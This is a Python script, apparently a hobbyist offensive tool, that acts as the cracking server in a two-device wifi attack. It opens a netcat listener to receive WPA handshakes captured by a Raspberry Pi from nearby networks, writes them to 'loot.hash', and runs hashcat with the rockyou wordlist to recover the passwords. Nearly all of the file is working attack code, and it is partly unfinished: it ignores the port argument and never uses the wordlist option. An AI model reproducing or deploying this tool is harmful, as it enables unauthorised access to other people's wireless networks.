#!/bin/python3
# Created by the Pizza Processing Unit
#
#                                       -:------`
#                                      +ssoooo/:-.``
#                                    .ossssoohhhso+:-``
#                                  .-+s+/::++syso+sso/:..``
#                                .:+oosso+-.-:/+///ossooo/-.``
#                              `:/+oooo++:` ``.--..syysooooo:-.`
#                             ./soooos++/`        `:/::/ooss+/:...`
#                            :++++///-....`.::--...`-` `.-/ooo+:-..`.`
#                           .:/.````..-/+oooossoooo+/.    -:oyhso/:-`.``
#                         .--//-.`..-::+ooosoooosooooo/-.```:++o+++/-....`
#                      `://///////:-.--/osssssssssssso+`.` ``:+sssso/:-``..`
#                    `-+/+/++ooooooooo+/:+ossoosssso+:. `..-:+ossyyyyo++.``--`
#                    `-:osssosssoososso/``.://////:-.``:+++ossosyhyssso:..--..
#                   `.-/osssssssssossss+:////:///:..:-:/++oosooooooo+oo//-.``
#                 `` `.-:+oosssosssso++++/+oosoooo+-.-+///+//+o+ss+/:-..`
#              `-/+++:... `.-:///+/:..+/+osooo+s++o+/:+//://///:--...`
#            -/ooooo++/--.-:++++++/:.-//+ooo++/+ooo+/:.::-` `.`.``
#          -+ooooooooo+:./++so+o+//shs///sssso+//:///:::.``
#        .+sssossoo+-``.+/:+osoo//s+syy++////-..:::-.``
#      `:osssso+/:-````.oo+osyysossssys+/-````
#      `..--.`-:--...:/:sssyssyso+/::-.
#    `.--....`.-.-:/++oo//::-..`
#    .----:++:..-.`
#     `-:-.``

# wifi-hacking device = WHD
# handshake cracking server = HCS
# this tool should be run on your HCS
# the purpose is to listen for hashes sent from your WHD, in my case a raspberry pi3 B+
# the WHD scans for wifi networks, picks the strongest one, tries to capture the handshake, and then sends the handshake to the HCS
# the HCS listens on a port for the handshake, and when it recieves it, it attempts to crack it
# if it's successful, it should sent the password and SSID back to the WHD
# the WHD should store/display the wifi network and password

import argparse
import subprocess
import shutil
from os import path
import pathlib
import time
import datetime
from termcolor import colored

# Set up the argument parser
parser = argparse.ArgumentParser(description='A tool to crack wifi passwords using a mobile wifihacking device and a remote server to crack the handshakes.')

parser.add_argument('-w', '--wordlist', metavar=colored('wordlist', 'green'), action="store", required=False, help='Full path to the wordlist you want to use to crack the handshake')
parser.add_argument('-p', '--port', metavar=colored('port', 'green'), action="store", required=False, help='The port you want to listen on for the handshake; must be the same as the port setup on the wifi-hacking device')
parser.add_argument('-d', '--device', metavar=colored('device', 'green'), action="store", required=False, help='The ip/hostname of the device you want to send the wifi SSID and password to, usually the WHD, can be something else, if it\'s listening')

port = parser.parse_args().port

print(colored("test","yellow"))

# Check if loot.hash already exists, if it does, back it up 

if path.exists("loot.hash"):
	print("loot.hash already exists, renaming...")
	shutil.move("loot.hash", "loot.hash" + str(datetime.datetime.now().timestamp()))
	pathlib.Path("loot.hash").touch()

print(f"Starting process to read hashes sent to port {port}...")

nc_listener = subprocess.Popen(["nc -lvp 22200 > loot.hash"], shell=True, stdout=subprocess.DEVNULL)

print("Waiting for hashes...")
time.sleep(.5)

# Loop to wait until we get the hashes on the specified port
# you can test this by running "echo test | nc {HCS-ip} {HCS-port}" on the WHD 
while True:
	hashes = open("loot.hash", "rt")
	loot = hashes.read()
	if loot != '':
		print(f"loot.hash contains {loot}")
		nc_listener.kill()
		break
	else:
		time.sleep(5)

# time to crack the hash

subprocess.Popen(['hashcat -m 22000 loot.hash /usr/share/wordlists/rockyou.txt'], shell=True)
